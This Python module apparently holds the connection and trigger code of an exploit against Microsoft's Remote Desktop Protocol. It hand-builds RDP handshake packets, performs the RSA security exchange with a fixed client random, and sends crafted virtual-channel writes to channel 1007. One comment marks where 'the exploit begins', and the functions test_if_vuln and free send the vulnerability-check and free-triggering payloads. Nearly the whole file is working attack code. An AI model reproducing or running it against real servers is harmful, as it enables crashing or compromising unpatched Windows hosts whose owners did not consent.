import binascii
import string
import random
import struct
import time

from OpenSSL import *
from Crypto.PublicKey.RSA import construct

import rdp_crypto

def connect_req(name):

    packet =   binascii.unhexlify('0300002e29e00000000000436f6f6b69653a206d737473686173683d')
    packet += name                            #1
    packet += binascii.unhexlify('0d0a0100080000000000')

    return packet


# initial mcs connect pdu this is where the exploit begins 

def mcs_connect_init_pdu():

    packet = (
'030001be02f0807f658201b20401010401010101ff30200202002202020002020200000202000102020000020200010202ffff020200023020020200010202000102020001020200010202000002020001020204200202000230200202ffff0202fc170202ffff0202000102020000020200010202ffff020200020482013f000500147c00018136000800100001c00044756361812801c0d800040008002003580201ca03aa09040000280a00006b0061006c00690000000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca0100000000001800070001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004c00c00090000000000000002c00c00030000000000000003c03800040000007264706472000000000000c0726470736e640000000000c04d535f5431323000808000004d535f543132300080800000'
    )

    return binascii.unhexlify(packet)

def erect_domain_req():

    packet = ( '0300000c02f0800400010001' )
    return binascii.unhexlify(packet)
    
def attach_user_req():

    packet = ( '0300000802f08028' )
    return binascii.unhexlify(packet)

# channel join request packets

def get_chan_join_req():

    packet = ( '0300000c02f08038000703' )#was 0503
    start = 'eb'
    channels = []

    for c in range(0, 6): #4
        channelid = int(start, 16) + c
        channel = packet + format(channelid, 'x')
        channels.append(channel)

    return channels

# parce mcs connection resp (in wireshark as ServerData) packet.
# returns an rsa pubkey object and the server random data used later to 
# generate session encryption keys

def parse_mcs_conn_resp(packet):
    
    # 4.1.4 Server MCS Connect Response PDU with GCC Conference Create Response
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/d23f7725-876c-48d4-9e41-8288896a19d3
    # 2.2.1.4.3.1.1.1 RSA Public Key (RSA_PUBLIC_KEY)
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/fe93545c-772a-4ade-9d02-ad1e0d81b6af

    # all the next slicing makes sense when looking at above two links

    # find headerType serverSecurityData (0x0c02)
    header_offset = packet.find(b'\x02\x0c')
    sec_data = packet[header_offset:]

    ran_len = int.from_bytes(sec_data[12:12+4], byteorder='little')
    server_ran = sec_data[20:20+ran_len]

    # magic number
    server_cert_offset = packet.find(b'\x52\x53\x41\x31')
    server_cert = packet[server_cert_offset:]

    key_len = int.from_bytes(server_cert[4:8], byteorder='little')
    bit_len = int.from_bytes(server_cert[8:12], byteorder='little')

    rsa_pub_exp = int.from_bytes(server_cert[16:20], byteorder='little')
    rsa_pub_mod = int.from_bytes(server_cert[20:20+key_len], byteorder='little')

    #print('pub_mod = %s' % binascii.hexlify(server_cert[20:20+key_len]))
    #print('keylen: %d' % key_len)
    #print('bitlen: %d' % bit_len)     
    #print('pub exp: %d' % rsa_pub_exp)


    pubkey = construct((rsa_pub_mod, rsa_pub_exp))

    crypt = []
    crypt.append(server_ran)
    crypt.append(pubkey)
    crypt.append(bit_len)

    return crypt

# the securty exchange (send our client random encrypted with servers pub RSA key)

def sec_exchange(pubkey, bit_len):

    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/ca73831d-3661-4700-9357-8f247640c02e
    # 5.3.4.1 Encrypting Client Random
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/761e2583-6406-4a71-bfec-cca52294c099

    tpkt = binascii.unhexlify('0300') # still require two bytes for size

    mcs_pdu = binascii.unhexlify('02f08064000503eb70')

    enc_client_ran = pubkey.encrypt(b'A'*32, None)[0]

    # reverse for little endian
    enc_client_ran = enc_client_ran[::-1]
    enc_client_ran = enc_client_ran.ljust(int((bit_len/8)+8), b'\x00')
    sec_exchange_len = struct.pack('<I', len(enc_client_ran))

    sec_flags = binascii.unhexlify('01000000') #48000000')

    sec_exchange_pdu = sec_flags + sec_exchange_len + enc_client_ran

    mcs_pdu_size = struct.pack('>H', len(sec_exchange_pdu)+0x8000)
    mcs_pdu += mcs_pdu_size


    to_send = mcs_pdu + sec_exchange_pdu

    #add 4 for tpkt hdr/size
    total_size = len(to_send) + 4
    tpkt += struct.pack('>H', total_size) + to_send

    return tpkt

# client info

def client_info(crypter, name):

    packet_hdr = binascii.unhexlify('0300015902f08064000503eb70814a48000000')

    packet = binascii.unhexlify('00000000330100000000100000000000000000')

    # 2 byte unicode for the name
    name = b''.join([b'0'+bytes([b]) for b in name])

    packet += name

    packet += binascii.unhexlify('00000000000000000002001a003100390032002e003100360038002e0030002e003300340000003c0043003a005c00570049004e004e0054005c00530079007300740065006d00330032005c006d007300740073006300610078002e0064006c006c0000002c0100004700540042002c0020006e006f0072006d0061006c0074006900640000000000000000000000000000000000000000000000000000000000000000000000000000000a00000005000300000000000000000000004700540042002c00200073006f006d006d006100720074006900640000000000000000000000000000000000000000000000000000000000000000000000000000000300000005000200000000000000c4ffffff00000000270000000000')

    packet_sig = crypter.sign(packet) 
    packet_enc = crypter.encrypt(packet)

    return packet_hdr + packet_sig + packet_enc


# send client confirm active pdu

def client_confirm(crypter):

    packet_hdr = binascii.unhexlify('030001bf02f08064000503eb7081b0')

    sec_hdr = binascii.unhexlify('08000000')

    packet = binascii.unhexlify('a4011300ee03ea030100ea0306008e014d53545343000e00000001001800010003000002000000000c04000000000000000002001c00ffff01000100010020035802000001000100000001000000030058000000000000000000000000000000000000000000010014000000010047012a000101010100000000010101010001010000000000010101000001010100000000a1060000000000000084030000000000e40400001300280000000003780000007800000050010000000000000000000000000000000000000000000008000a000100140014000a0008000600000007000c00000000000000000005000c00000000000200020009000800000000000f000800010000000d005800010000000904000004000000000000000c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000800010000000e0008000100000010003400fe000400fe000400fe000800fe000800fe001000fe002000fe004000fe008000fe000001400000080001000102000000')

    packet_sig = crypter.sign(packet)
    packet_enc = crypter.encrypt(packet)
    
    return packet_hdr + sec_hdr + packet_sig + packet_enc

# send client sync

def client_sync(crypter):

    packet_hdr = binascii.unhexlify('0300003102f08064000503eb708022')

    sec_hdr = binascii.unhexlify('08000000') 

    packet = binascii.unhexlify('16001700ee03ea030100000108001f0000000100ea03')

    packet_sig = crypter.sign(packet)
    packet_enc = crypter.encrypt(packet)
    
    return packet_hdr + sec_hdr + packet_sig + packet_enc


# send client cooperate

def client_cooperate(crypter):

    packet_hdr = binascii.unhexlify('0300003502f08064000503eb708026')

    sec_hdr = binascii.unhexlify('08000000') 

    packet = binascii.unhexlify('1a001700ee03ea03010000010c00140000000400000000000000')

    packet_sig = crypter.sign(packet) 
    packet_enc = crypter.encrypt(packet)
    
    return packet_hdr + sec_hdr + packet_sig + packet_enc

# send client control request

def client_control_req(crypter):

    packet_hdr = binascii.unhexlify('0300003502f08064000503eb708026')

    sec_hdr = binascii.unhexlify('08000000') 

    packet = binascii.unhexlify('1a001700ee03ea03010000010c00140000000100000000000000')

    packet_sig = crypter.sign(packet)
    packet_enc = crypter.encrypt(packet)
    
    return packet_hdr + sec_hdr + packet_sig + packet_enc

# send client persistent key length

def client_persistent_key_len(crypter):

    packet_hdr = binascii.unhexlify('0300003d02f08064000503eb70802e')

    sec_hdr = binascii.unhexlify('08000000') 

    packet = binascii.unhexlify('22001700ee03ea030100000114001c00000001000000000000000000000000000000')

    packet_sig = crypter.sign(packet)
    packet_enc = crypter.encrypt(packet)
    
    return packet_hdr + sec_hdr + packet_sig + packet_enc

# send client font list

def client_font_list(crypter):

    packet_hdr = binascii.unhexlify('0300003502f08064000503eb708026')

    sec_hdr = binascii.unhexlify('08000000')

    packet = binascii.unhexlify('1a001700ee03ea03010000010c00270000000000000003003200')

    packet_sig = crypter.sign(packet)
    packet_enc = crypter.encrypt(packet)
    
    return packet_hdr + sec_hdr + packet_sig + packet_enc

def send_dc():
    return binascii.unhexlify('0300000b06800000000000')


# params
# initiator is two byte channel initiator
# channelid is two byte channel id
# virt_chan_data is data to send

def write_virtual_channel(crypter, initiator, channelId, virt_chan_data):

    tpkt = binascii.unhexlify('0300') # still require two bytes for size

    x224 = binascii.unhexlify('02f080')

    mcs_pdu = binascii.unhexlify('64') 
    mcs_pdu += struct.pack('>H', initiator)
    mcs_pdu += struct.pack('>H', channelId)
    mcs_pdu += binascii.unhexlify('70') # flags had 80

    sec_hdr = binascii.unhexlify('08000000')

#    channel_pdu_flags = binascii.unhexlify('03000000') # original
    channel_pdu_flags = binascii.unhexlify('42424242')

    # the len is not correct
    channel_pdu_hdr = struct.pack('<I', len(virt_chan_data)) + channel_pdu_flags

    virt_chan_pdu = channel_pdu_hdr + virt_chan_data

    packet_sig = crypter.sign(virt_chan_pdu)
    virt_chan_pdu_enc = crypter.encrypt(virt_chan_pdu)

    send_data = sec_hdr + packet_sig + virt_chan_pdu_enc

    mcs_pdu_size = struct.pack('>H', len(send_data)+0x8000)
    #print('mcs_pdu_size')
    #print(binascii.hexlify(mcs_pdu_size))
    mcs_pdu += mcs_pdu_size

    to_send = x224 + mcs_pdu + send_data

    #add 4 for tpkt hdr/size
    total_size = len(to_send) + 4
    tpkt += struct.pack('>H', total_size) + to_send

    #print('len of tpkt')
    #print(binascii.hexlify(struct.pack('>H', total_size)))
    #print(binascii.hexlify(tpkt))
    
    return tpkt


def test_if_vuln_32(crypter):
    
    to_send = binascii.unhexlify('00000000020000000000000000000000')

    return write_virtual_channel(crypter, 7, 1007, to_send)


def test_if_vuln_64(crypter):

    to_send = binascii.unhexlify('0000000000000000020000000000000000000000000000000000000000000000')

    return write_virtual_channel(crypter, 7, 1007, to_send)


def free_32(crypter):

#    packet_hdr = binascii.unhexlify('0300003502f08064000703ef708026')
#    sec_hdr = binascii.unhexlify('08000000')

#    packet = binascii.unhexlify('1200000003000000000000000200000000000000000000005A5A')

#    packet_sig = crypter.sign(packet)
#    packet_enc = crypter.encrypt(packet)
    
#    return packet_hdr + sec_hdr + packet_sig + packet_enc

    to_send = binascii.unhexlify('000000000200000000000000000000005A5A')

    return write_virtual_channel(crypter, 7, 1007, to_send)


def free_64(crypter):

    to_send = binascii.unhexlify('00000000000000000200000000000000000000000000000000000000000000005A5A')

    return write_virtual_channel(crypter, 7, 1007, to_send)


def get_ran_name():
    name = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
    return name.encode('utf-8')


# commence janky parsing
# might be useful 

def get_tpkt_size(tpkt):
    
    return int.from_bytes(tpkt[2:4], byteorder='big')

def read_rdp_data(s, crypter):

    resp = b''

    while True:

        resp = resp + s.recv(8192)

        len_msg = len(resp)

        tpkt_offset = resp.find(b'\x03\x00') 

        size = get_tpkt_size(resp[tpkt_offset:tpkt_offset+4])

        if size <= len_msg:
            parse_data(crypter, resp[tpkt_offset:tpkt_offset+size]) 

            resp = resp[tpkt_offset+size:]


def get_data(crypter, data):

    data_len = len(data)
    print('len of data = %d' % data_len)

    tpkt = data[0:4]

    if tpkt[0] != 3:
        print('Error not tpkt')
        return
    
    size = int.from_bytes(tpkt[2:4], byteorder='big')
    print('size = %d' % size)
    
    parse_data(crypter, data[:size])

    parsed = size 
    
    while parsed < data_len:

        tpkt = data[parsed:parsed+4]

        if tpkt[0] != 3:
            print('Error not tpkt')
            return

        size = int.from_bytes(tpkt[2:4], byteorder='big')

        parse_data(crypter, data[parsed:parsed+size])

        parsed = parsed + size
   
        

def parse_data(crypter, data):
    
    tpkt = data[0:4]
    
    ctop = data[4:7]

    # PDU
    pdu_type = data[7:8]
    initiator = data[8:10]
    channel_id = data[10:12]
    print('data from %d to channel id = %d' % (int.from_bytes(initiator, byteorder='big'), int.from_bytes(channel_id, byteorder='big')))


    sec_hdr_offset = data.find(b'\x08\x00\x00\x00')

    sec_hdr = data[sec_hdr_offset:sec_hdr_offset+4]

    print('sec_hdr: %s' % binascii.hexlify(sec_hdr))
    sig = data[sec_hdr_offset+4:sec_hdr_offset+12]

    print('sig: %s' % binascii.hexlify(sig))

    enc_data = data[sec_hdr_offset+12:]

    print('enc_data: %s' % binascii.hexlify(enc_data))

    print('decrypted data: %s' % binascii.hexlify(crypter.decrypt(enc_data)))


def connect(s):

    name = get_ran_name()

    
    print('[+] initializing connection')
    # x.224 connection initiation
    s.sendall(connect_req(name))
    s.recv(4096)
        

    print('[+] sending basic settings exchange')
    # basic settings exchange
    s.sendall(mcs_connect_init_pdu())
    p = s.recv(4096)
    time.sleep(.25)
    server_ran, pub_key, bit_len = parse_mcs_conn_resp(p)
    client_ran = b'A'*32

    # channel connection
    print('[+] sending erect domain and attach user')
    s.sendall(erect_domain_req())
    s.sendall(attach_user_req())
    time.sleep(.25)
    s.recv(4096)

    print('[+] sending channel join requests')
    # join requests
    channels = get_chan_join_req()
    for channel in channels:
        s.sendall(binascii.unhexlify(channel))    
        s.recv(4096)

    print('[+] sending security exchange')
    # security exchange
    s.sendall(sec_exchange(pub_key, bit_len))
    time.sleep(.5)
        
    non_fips = rdp_crypto.non_fips(server_ran, client_ran)
    crypter = rdp_crypto.rc4_crypter(non_fips)

    # client info pdu
    s.sendall(client_info(crypter, name))
    s.recv(4096)
    time.sleep(.5)

    # encrypted data begins here 
    resp = s.recv(8192)
#    get_data(crypter, resp)


   # print('[+] finalizing connection sequence')

    print('[+] sending client confirm')
    # send client confirm active pdu
    s.sendall(client_confirm(crypter))
    time.sleep(.15)

    resp = s.recv(8192)
#    get_data(crypter, resp)

    # send client sync

    print('[+] sending client sync')
    s.sendall(client_sync(crypter))
    time.sleep(.15)

    # send client cooperate

    print('[+] sending client cooperate')
    s.sendall(client_cooperate(crypter))
    time.sleep(.15)
   
    # send client control request
    print('[+] sending client control req')
    s.sendall(client_control_req(crypter))
    time.sleep(.15)

    resp = s.recv(8192)
#    get_data(crypter, resp)

    # send client persistent key length
    print('[+] sending persistent key len')
    s.sendall(client_persistent_key_len(crypter))
    time.sleep(.15)
    
    # send client font list
    print('[+] sending client font list')
    s.sendall(client_font_list(crypter))


    print('[+] connection established')

#    read_rdp_data(s, crypter)

    return crypter

